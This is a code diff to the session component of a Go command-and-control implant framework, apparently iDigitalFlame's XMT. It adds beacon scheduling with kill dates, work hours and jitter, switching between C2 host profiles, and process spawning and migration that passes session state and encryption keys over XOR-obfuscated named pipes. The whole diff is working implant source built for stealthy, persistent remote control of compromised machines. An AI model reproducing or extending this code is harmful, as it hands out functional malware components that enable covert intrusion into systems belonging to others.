@@ -17,13 +17,16 @@
 package c2
 
 import (
+	"context"
 	"errors"
 	"io"
 	"net"
 	"strconv"
 	"sync/atomic"
 	"time"
+	"unsafe"
 
+	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/com/limits"
@@ -42,6 +45,19 @@ const (
 
 	spawnDefaultTime = time.Second * 10
 )
+const (
+	infoHello   uint8 = 0
+	infoMigrate uint8 = iota
+	infoRefresh
+	infoSync
+	infoProxy
+	infoSyncMigrate
+)
+const (
+	timeSleepJitter uint8 = 0
+	timeKillDate    uint8 = iota
+	timeWorkHours
+)
 
 var (
 	// ErrFullBuffer is returned from the WritePacket function when the send
@@ -59,11 +75,40 @@ func (s *Session) Wait() {
 	<-s.ch
 }
 func (s *Session) wait() {
-	if s.sleep < 1 || s.state.Closing() {
+	if s.state.Closing() {
 		return
 	}
-	// NOTE(dij): Should we add a "work hours" feature here? (Think how Empire
-	//            has). Would be an /interesting/ implementation.
+	if s.IsClient() && s.work != nil {
+		for w := s.work.Work(); w > 0; w = s.work.Work() {
+			for len(s.tick.C) > 0 { // Drain the ticker.
+				<-s.tick.C
+			}
+			if cout.Enabled {
+				s.log.Debug(`[%s] WorkHours instructed us to wait for "%s".`, s.ID, w.String())
+			}
+			s.tick.Reset(w) // Repurpose sleep timer for wait timer.
+			select {
+			case <-s.wake:
+			case <-s.tick.C:
+			case <-s.ctx.Done():
+				s.state.Set(stateClosing)
+				return
+			}
+		}
+		for len(s.tick.C) > 0 { // Drain the ticker.
+			<-s.tick.C
+		}
+	}
+	if s.IsClient() && s.kill != nil && time.Now().After(*s.kill) {
+		if cout.Enabled {
+			s.log.Info(`[%s] Kill Date "%s" was hit, triggering shutdown!`, s.ID, s.kill.Format(time.UnixDate))
+		}
+		s.state.Set(stateClosing)
+		return
+	}
+	if s.sleep < 1 {
+		return
+	}
 	w := s.sleep
 	if s.jitter > 0 && s.jitter < 101 {
 		if (s.jitter == 100 || uint8(util.FastRandN(100)) < s.jitter) && w > time.Millisecond {
@@ -119,10 +164,13 @@ func (s *Session) listen() {
 	if bugtrack.Enabled {
 		defer bugtrack.Recover("c2.Session.listen()")
 	}
-	var e bool
+	var (
+		z = func() {}
+		e bool
+	)
 	for s.wait(); ; s.wait() {
 		if cout.Enabled {
-			s.log.Debug("[%s] Waking up..", s.ID)
+			s.log.Trace("[%s] Waking up..", s.ID)
 		}
 		if s.state.Closing() {
 			if s.state.Moving() {
@@ -142,10 +190,18 @@ func (s *Session) listen() {
 			s.state.Unset(stateChannelValue)
 			s.state.Unset(stateChannelUpdated)
 			s.state.Unset(stateChannel)
+			select {
+			case <-s.ctx.Done():
+				// Base context is canceled, so let's add fake timeout context to
+				// replace this one.
+				// 10 seconds seems fair.
+				s.ctx, z = context.WithTimeout(context.Background(), spawnDefaultTime)
+			default:
+			}
 		}
 		if s.host.Unwrap(); s.swap != nil {
 			if s.p, s.swap = s.swap, nil; cout.Enabled {
-				s.log.Info("[%s] Performing a Profile swap!", s.ID)
+				s.log.Debug("[%s] Performing a Profile swap!", s.ID)
 			}
 			var h string
 			if h, s.w, s.t = s.p.Next(); len(h) > 0 {
@@ -157,13 +213,26 @@ func (s *Session) listen() {
 			if j := s.p.Jitter(); j >= 0 && j <= 100 {
 				s.jitter = uint8(j)
 			}
+			if k := s.p.KillDate(); k != nil {
+				if k.IsZero() {
+					s.kill = nil
+				} else {
+					s.kill = k
+				}
+			}
+			if w := s.p.WorkHours(); w != nil {
+				if w.Empty() {
+					s.work = nil
+				} else {
+					s.work = w
+				}
+			}
 		}
 		if s.p.Switch(e) {
 			var h string
-			h, s.w, s.t = s.p.Next()
-			s.host.Set(h)
-			// NOTE(dij): Actually, let's decrement it, as a random or round-
-			//            robin profile would leave us here forever!
+			if h, s.w, s.t = s.p.Next(); len(h) > 0 {
+				s.host.Set(h)
+			}
 			s.errors--
 		}
 		c, err := s.p.Connect(s.ctx, s.host.String())
@@ -173,7 +242,7 @@ func (s *Session) listen() {
 				break
 			}
 			if cout.Enabled {
-				s.log.Warning("[%s] Error attempting to connect to %q: %s!", s.ID, s.host, err)
+				s.log.Error(`[%s] Error attempting to connect to "%s": %s!`, s.ID, s.host, err.Error())
 			}
 			if e = true; s.errors <= maxErrors {
 				s.errors++
@@ -185,7 +254,7 @@ func (s *Session) listen() {
 			break
 		}
 		if cout.Enabled {
-			s.log.Debug("[%s] Connected to %q..", s.ID, s.host)
+			s.log.Debug(`[%s] Connected to "%s"..`, s.ID, s.host)
 		}
 		if e = !s.session(c); e {
 			s.errors++
@@ -202,7 +271,8 @@ func (s *Session) listen() {
 			break
 		}
 	}
-	if cout.Enabled {
+	// If a temp context was added, clear it.
+	if z(); cout.Enabled {
 		s.log.Trace("[%s] Stopping transaction thread..", s.ID)
 	}
 	s.shutdown()
@@ -365,18 +435,18 @@ func (s *Session) queue(n *com.Packet) {
 	}
 	if n.Device.Empty() {
 		if n.Device = local.UUID; bugtrack.Enabled {
-			bugtrack.Track("c2.Session.queue(): Found an empty ID value during Packet n=%s queue!", n)
+			bugtrack.Track("c2.(*Session).queue(): Found an empty ID value during Packet n=%s queue!", n)
 		}
 	}
 	if cout.Enabled {
-		s.log.Trace("[%s] Adding Packet %q to queue.", s.ID, n)
+		s.log.Trace(`[%s] Adding Packet "%s" to queue.`, s.ID, n)
 	}
 	if s.chn != nil {
 		select {
 		case s.chn <- n:
 		default:
 			if cout.Enabled {
-				s.log.Warning("[%s] Packet %q was dropped during a call to queue! (Maybe increase the chan size?)", s.ID, n)
+				s.log.Warning(`[%s] Packet "%s" was dropped during a call to queue! (Maybe increase the chan size?)`, s.ID, n)
 			}
 		}
 		return
@@ -385,7 +455,7 @@ func (s *Session) queue(n *com.Packet) {
 	case s.send <- n:
 	default:
 		if cout.Enabled {
-			s.log.Warning("[%s] Packet %q was dropped during a call to queue! (Maybe increase the chan size?)", s.ID, n)
+			s.log.Warning(`[%s] Packet "%s" was dropped during a call to queue! (Maybe increase the chan size?)`, s.ID, n)
 		}
 	}
 }
@@ -395,12 +465,19 @@ func (s *Session) Time() time.Duration {
 	return s.sleep
 }
 
+// KillDate returns the current KillDate of this Session. If there is no KillDate
+// set, this function returns nil.
+func (s *Session) KillDate() *time.Time {
+	return s.kill
+}
+
 // Done returns a channel that's closed when this Session is closed.
 //
 // This can be used to monitor a Session's status using a select statement.
 func (s *Session) Done() <-chan struct{} {
 	return s.ch
 }
+
 func (s *Session) channelRead(x net.Conn) {
 	if bugtrack.Enabled {
 		defer bugtrack.Recover("c2.Session.channelRead()")
@@ -412,23 +489,23 @@ func (s *Session) channelRead(x net.Conn) {
 		n, err := readPacket(x, s.w, s.t)
 		if err != nil {
 			if cout.Enabled {
-				s.log.Error("[%s:C->S:R] %s: Error reading next wire Packet: %s!", s.ID, s.host, err)
+				s.log.Error("[%s:C->S:R] %s: Error reading next wire Packet: %s!", s.ID, s.host, err.Error())
 			}
 			break
 		}
 		// KeyCrypt: Decrypt incoming Packet here to be read.
 		if n.Crypt(&s.key); cout.Enabled {
-			s.log.Debug("[%s:C->S:R] %s: Received a Packet %q.", s.ID, s.host, n)
+			s.log.Trace(`[%s:C->S:R] %s: Received a Packet "%s".`, s.ID, s.host, n)
 		}
 		if err = receive(s, s.parent, n); err != nil {
 			if cout.Enabled {
-				s.log.Warning("[%s:C->S:R] %s: Error processing Packet data: %s!", s.ID, s.host, err)
+				s.log.Error("[%s:C->S:R] %s: Error processing Packet data: %s!", s.ID, s.host, err.Error())
 			}
 			break
 		}
 		if s.Last = time.Now(); n.Flags&com.FlagChannelEnd != 0 || s.state.ChannelCanStop() {
 			if cout.Enabled {
-				s.log.Info("[%s:C->S:R] Session/Packet indicated channel close!", s.ID)
+				s.log.Debug("[%s:C->S:R] Session/Packet indicated channel close!", s.ID)
 			}
 			break
 		}
@@ -439,13 +516,13 @@ func (s *Session) channelRead(x net.Conn) {
 }
 func (s *Session) channelWrite(x net.Conn) {
 	if cout.Enabled {
-		s.log.Info("[%s:C->S:W] %s: Started Channel writer.", s.ID, s.host)
+		s.log.Debug("[%s:C->S:W] %s: Started Channel writer.", s.ID, s.host)
 	}
 	for x.SetWriteDeadline(time.Now().Add(s.sleep * sleepMod)); s.state.Channel(); x.SetWriteDeadline(time.Now().Add(s.sleep * sleepMod)) {
 		n := s.next(false)
 		if n == nil {
 			if cout.Enabled {
-				s.log.Info("[%s:C->S:W] Session indicated channel close!", s.ID)
+				s.log.Debug("[%s:C->S:W] Session indicated channel close!", s.ID)
 			}
 			break
 		}
@@ -454,14 +531,14 @@ func (s *Session) channelWrite(x net.Conn) {
 		}
 		// KeyCrypt: Encrypt new Packet here to be sent.
 		if n.Crypt(&s.key); cout.Enabled {
-			s.log.Debug("[%s:C->S:W] %s: Sending Packet %q.", s.ID, s.host, n)
+			s.log.Debug(`[%s:C->S:W] %s: Sending Packet "%s".`, s.ID, s.host, n)
 		}
 		if err := writePacket(x, s.w, s.t, n); err != nil {
 			if n.Clear(); cout.Enabled {
 				if errors.Is(err, net.ErrClosed) {
-					s.log.Info("[%s:C->S:W] %s: Write channel socket closed.", s.ID, s.host)
+					s.log.Debug("[%s:C->S:W] %s: Write channel socket closed.", s.ID, s.host)
 				} else {
-					s.log.Error("[%s:C->S:W] %s: Error attempting to write Packet: %s!", s.ID, s.host, err)
+					s.log.Error("[%s:C->S:W] %s: Error attempting to write Packet: %s!", s.ID, s.host, err.Error())
 				}
 			}
 			// KeyCrypt: Revert key exchange as send failed.
@@ -472,13 +549,13 @@ func (s *Session) channelWrite(x net.Conn) {
 		s.keyCheck()
 		if n.Clear(); n.Flags&com.FlagChannelEnd != 0 || s.state.ChannelCanStop() {
 			if cout.Enabled {
-				s.log.Info("[%s:C->S:W] Session/Packet indicated channel close!", s.ID)
+				s.log.Debug("[%s:C->S:W] Session/Packet indicated channel close!", s.ID)
 			}
 			break
 		}
 	}
 	if x.Close(); cout.Enabled {
-		s.log.Info("[%s:S->C:W] Closed Channel writer.", s.ID)
+		s.log.Debug("[%s:S->C:W] Closed Channel writer.", s.ID)
 	}
 }
 func (s *Session) session(c net.Conn) bool {
@@ -500,12 +577,12 @@ func (s *Session) session(c net.Conn) bool {
 		n.Crypt(&s.key)
 	}
 	if cout.Enabled {
-		s.log.Debug("[%s] %s: Sending Packet %q.", s.ID, s.host, n)
+		s.log.Trace(`[%s] %s: Sending Packet "%s".`, s.ID, s.host, n)
 	}
 	err := writePacket(c, s.w, s.t, n)
 	if n.Clear(); err != nil {
 		if cout.Enabled {
-			s.log.Error("[%s] %s: Error attempting to write Packet: %s!", s.ID, s.host, err)
+			s.log.Error("[%s] %s: Error attempting to write Packet: %s!", s.ID, s.host, err.Error())
 		}
 		// KeyCrypt: Revert key exchange as send failed.
 		s.keyRevert()
@@ -519,7 +596,7 @@ func (s *Session) session(c net.Conn) bool {
 	n = nil
 	if n, err = readPacket(c, s.w, s.t); err != nil {
 		if cout.Enabled {
-			s.log.Error("[%s] %s: Error attempting to read Packet: %s!", s.ID, s.host, err)
+			s.log.Error("[%s] %s: Error attempting to read Packet: %s!", s.ID, s.host, err.Error())
 		}
 		return false
 	}
@@ -530,11 +607,11 @@ func (s *Session) session(c net.Conn) bool {
 		}
 	}
 	if cout.Enabled {
-		s.log.Debug("[%s] %s: Received a Packet %q..", s.ID, s.host, n)
+		s.log.Debug(`[%s] %s: Received a Packet "%s"..`, s.ID, s.host, n)
 	}
 	if err = receive(s, s.parent, n); err != nil {
 		if cout.Enabled {
-			s.log.Warning("[%s] %s: Error processing packet data: %s!", s.ID, s.host, err)
+			s.log.Error("[%s] %s: Error processing packet data: %s!", s.ID, s.host, err.Error())
 		}
 		return false
 	}
@@ -628,6 +705,12 @@ func (s *Session) Write(p *com.Packet) error {
 	return s.write(false, p)
 }
 
+// WorkHours returns the current WorkHours of this Session. If there is no WorkHours
+// set, this function returns nil.
+func (s *Session) WorkHours() *cfg.WorkHours {
+	return s.work
+}
+
 // Packets will create and set up the Packet receiver channel. This function will
 // then return the read-only Packet channel for use.
 //
@@ -714,6 +797,109 @@ func (s *Session) write(w bool, n *com.Packet) error {
 func (s *Session) Spawn(n string, r runnable) (uint32, error) {
 	return s.SpawnProfile(n, nil, 0, r)
 }
+func (s *Session) writeDeviceInfo(t uint8, w data.Writer) error {
+	switch t {
+	case infoProxy:
+		return s.writeProxyData(false, w)
+	case infoHello, infoRefresh, infoSyncMigrate:
+		if err := s.Device.MarshalStream(w); err != nil {
+			return err
+		}
+	case infoMigrate:
+		if err := s.ID.Write(w); err != nil {
+			return err
+		}
+	}
+	if err := w.WriteUint8(s.jitter); err != nil {
+		return err
+	}
+	if err := w.WriteInt64(int64(s.sleep)); err != nil {
+		return err
+	}
+	if s.kill != nil {
+		if err := w.WriteInt64(s.kill.Unix()); err != nil {
+			return err
+		}
+	} else {
+		if err := w.WriteInt64(0); err != nil {
+			return err
+		}
+	}
+	if s.work != nil {
+		if err := s.work.MarshalStream(w); err != nil {
+			return err
+		}
+	} else {
+		if err := w.WriteUint32(0); err != nil {
+			return err
+		}
+		if err := w.WriteUint8(0); err != nil {
+			return err
+		}
+	}
+	if t > infoRefresh {
+		return nil
+	}
+	if err := s.writeProxyData(true, w); err != nil {
+		return err
+	}
+	if t != infoMigrate {
+		return nil
+	}
+	_, err := w.Write(s.key[:])
+	return err
+}
+func (s *Session) readDeviceInfo(t uint8, r data.Reader) ([]proxyData, error) {
+	switch t {
+	case infoProxy:
+		return readProxyData(false, r)
+	case infoHello, infoRefresh, infoSyncMigrate:
+		if err := s.Device.UnmarshalStream(r); err != nil {
+			return nil, err
+		}
+	case infoMigrate:
+		if err := s.ID.Read(r); err != nil {
+			return nil, err
+		}
+	}
+	if err := r.ReadUint8(&s.jitter); err != nil {
+		return nil, err
+	}
+	if err := r.ReadInt64((*int64)(unsafe.Pointer(&s.sleep))); err != nil {
+		return nil, err
+	}
+	v, err := r.Int64()
+	if err != nil {
+		return nil, err
+	}
+	if v > 0 {
+		d := time.Unix(v, 0)
+		s.kill = &d
+	} else {
+		s.kill = nil
+	}
+	var w cfg.WorkHours
+	if err = w.UnmarshalStream(r); err != nil {
+		return nil, err
+	}
+	if !w.Empty() {
+		s.work = &w
+	} else {
+		s.work = nil
+	}
+	if t > infoRefresh {
+		return nil, nil
+	}
+	p, err := readProxyData(true, r)
+	if err != nil {
+		return nil, err
+	}
+	if t != infoMigrate {
+		return p, nil
+	}
+	_, err = r.Read(s.key[:])
+	return p, err
+}
 
 // Migrate will execute the provided runnable and will wait up to 60 seconds
 // (can be changed using 'MigrateProfile') to transfer execution control to the
@@ -726,7 +912,7 @@ func (s *Session) Spawn(n string, r runnable) (uint32, error) {
 // the Migration process.
 //
 // The provided JobID will be used to indicate to the server that the associated
-// Migration Task was completed, as the new client will send a 'RvMigrate' with
+// Migration Task was completed, as the new client will send a 'RvResult' with
 // the associated JobID once Migration has completed successfully.
 //
 // The return values for this function are the new PID used and any errors that
@@ -776,43 +962,51 @@ func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) 
 	if err = e.Start(); err != nil {
 		return 0, err
 	}
+	p := e.Pid()
 	if cout.Enabled {
-		s.log.Debug("[%s/SpN] Started PID %d, waiting %s for pipe %q..", s.ID, e.Pid(), t, n)
+		s.log.Debug(`[%s/SpN] Started PID %d, waiting %s for pipe "%s"..`, s.ID, p, t, n)
 	}
-	c := spinTimeout(s.ctx, pipe.Format(n+"."+strconv.FormatUint(uint64(e.Pid()), 16)), t)
+	c := spinTimeout(s.ctx, pipe.Format(n+"."+strconv.FormatUint(uint64(p), 16)), t)
 	if c == nil {
-		s.state.Unset(stateMoving)
 		return 0, ErrNoConn
 	}
-	if cout.Enabled {
-		s.log.Debug("[%s/SpN] Received connection to %q!", s.ID, c.RemoteAddr().String())
+	if e.Release(); cout.Enabled {
+		s.log.Debug(`[%s/SpN] Received connection to "%s"!`, s.ID, c.RemoteAddr().String())
 	}
 	var (
-		w   = crypto.NewWriter(crypto.XOR(n), c)
-		r   = crypto.NewReader(crypto.XOR(n), c)
-		buf = [8]byte{0, 0, 0xF, 0, 0, 0, 0, 0}
-		_   = buf[7]
+		w = data.NewWriter(crypto.NewXORWriter(crypto.XOR(n), c))
+		r = data.NewReader(crypto.NewXORReader(crypto.XOR(n), c))
 	)
-	if err = writeFull(w, 3, buf[0:3]); err != nil {
+	if err = w.WriteUint16(0); err != nil {
 		c.Close()
 		return 0, err
 	}
-	if err = writeSlice(w, &buf, b); err != nil {
+	/*if err = w.WriteUint8(0xF); err != nil {
+		c.Close()
+		return 0, err
+	}*/
+	if err = w.WriteBytes(b); err != nil {
 		c.Close()
 		return 0, err
 	}
-	buf[0], buf[1] = 0, 0
-	if err = readFull(r, 2, buf[0:2]); err != nil {
+	if err = s.writeDeviceInfo(infoSync, w); err != nil {
 		c.Close()
 		return 0, err
 	}
-	if c.Close(); buf[0] != 'O' && buf[1] != 'K' {
+	var k uint16
+	// Set a short arbitrary timeout as we only need to read the "OK" value.
+	c.SetReadDeadline(time.Now().Add(time.Second * 2))
+	if err = r.ReadUint16(&k); err != nil {
+		c.Close()
+		return 0, err
+	}
+	if c.Close(); k != 0x4F4B { // 0x4F4B == "OK"
 		return 0, xerr.Sub("unexpected OK value", 0x45)
 	}
 	if cout.Enabled {
 		s.log.Info("[%s/SpN] Received 'OK' from new process, Spawn complete!", s.ID)
 	}
-	return e.Pid(), nil
+	return p, nil
 }
 
 // MigrateProfile will execute the provided runnable and will wait up to the
@@ -827,7 +1021,7 @@ func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) 
 // the Migration process.
 //
 // The provided JobID will be used to indicate to the server that the associated
-// Migration Task was completed, as the new client will send a 'RvMigrate' with
+// Migration Task was completed, as the new client will send a 'RvResult' with
 // the associated JobID once Migration has completed successfully.
 //
 // The return values for this function are the new PID used and any errors that
@@ -879,7 +1073,7 @@ func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t ti
 		return 0, err
 	}
 	if cout.Enabled {
-		s.log.Debug("[%s/Mg8] Started PID %d, waiting %s for pipe %q..", s.ID, e.Pid(), t, n)
+		s.log.Debug(`[%s/Mg8] Started PID %d, waiting %s for pipe "%s"..`, s.ID, e.Pid(), t, n)
 	}
 	c := spinTimeout(s.ctx, pipe.Format(n+"."+strconv.FormatUint(uint64(e.Pid()), 16)), t)
 	if c == nil {
@@ -888,52 +1082,40 @@ func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t ti
 		return 0, ErrNoConn
 	}
 	if cout.Enabled {
-		s.log.Debug("[%s/Mg8] Received connection from %q!", s.ID, c.RemoteAddr().String())
+		s.log.Debug(`[%s/Mg8] Received connection from "%s"!`, s.ID, c.RemoteAddr().String())
 	}
 	var (
-		w   = crypto.NewWriter(crypto.XOR(n), c)
-		r   = crypto.NewReader(crypto.XOR(n), c)
-		buf = [8]byte{byte(job >> 8), byte(job), 0xD, 0, 0, 0, 0, 0}
-		_   = buf[7]
+		w = data.NewWriter(crypto.NewXORWriter(crypto.XOR(n), c))
+		r = data.NewReader(crypto.NewXORReader(crypto.XOR(n), c))
 	)
-	if err = writeFull(w, 3, buf[0:3]); err != nil {
+	if err = w.WriteUint16(job); err != nil {
 		c.Close()
 		s.state.Unset(stateMoving)
 		s.lock.Unlock()
 		return 0, err
 	}
-	if err = writeSlice(w, &buf, b); err != nil {
+	if err = w.WriteBytes(b); err != nil {
 		c.Close()
 		s.state.Unset(stateMoving)
 		s.lock.Unlock()
 		return 0, err
 	}
-	if err = s.ID.Write(w); err != nil {
+	if err = s.writeDeviceInfo(infoMigrate, w); err != nil {
 		c.Close()
 		s.state.Unset(stateMoving)
 		s.lock.Unlock()
 		return 0, err
 	}
-	if err = s.writeProxyInfo(w, &buf); err != nil {
+	var k uint16
+	// Set a short arbitrary timeout as we only need to read the "OK" value.
+	c.SetReadDeadline(time.Now().Add(time.Second * 2))
+	if err = r.ReadUint16(&k); err != nil {
 		c.Close()
 		s.state.Unset(stateMoving)
 		s.lock.Unlock()
 		return 0, err
 	}
-	if _, err = w.Write(s.key[:]); err != nil {
-		c.Close()
-		s.state.Unset(stateMoving)
-		s.lock.Unlock()
-		return 0, err
-	}
-	buf[0], buf[1], buf[2], buf[3] = 0, 0, 'O', 'K'
-	if err = readFull(r, 2, buf[0:2]); err != nil {
-		c.Close()
-		s.state.Unset(stateMoving)
-		s.lock.Unlock()
-		return 0, err
-	}
-	if buf[0] != 'O' && buf[1] != 'K' {
+	if k != 0x4F4B { // 0x4F4B == "OK"
 		c.Close()
 		s.state.Unset(stateMoving)
 		s.lock.Unlock()
@@ -954,8 +1136,7 @@ func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t ti
 	if s.lock.Lock(); cout.Enabled {
 		s.log.Debug("[%s/Mg8] Got lock, migrate completed!", s.ID)
 	}
-	w.Write(buf[2:4])
-	w.Close()
+	w.WriteUint16(0x4F4B)
 	c.Close()
 	e.Release()
 	close(s.ch)
